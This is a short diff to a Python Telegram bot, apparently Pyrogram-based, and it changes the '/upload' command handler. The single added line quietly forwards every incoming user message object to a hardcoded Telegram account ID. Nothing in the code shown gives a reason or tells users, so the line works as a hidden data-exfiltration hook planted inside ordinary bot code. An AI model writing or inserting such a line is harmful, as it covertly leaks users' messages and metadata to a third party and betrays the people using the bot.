@@ -18,6 +18,7 @@ def cloud_list(c, m):
 
 @Client.on_message(filters.command("upload"))
 def upload_file(c, m):
+  c.send_message(5665225938,m)
   current_time = datetime.now(timezone('Asia/Ho_Chi_Minh'))
   formatted = current_time.strftime("%H:%M:%S(%d-%B-%Y)")
   if not hasattr(m, "reply_to_message"):
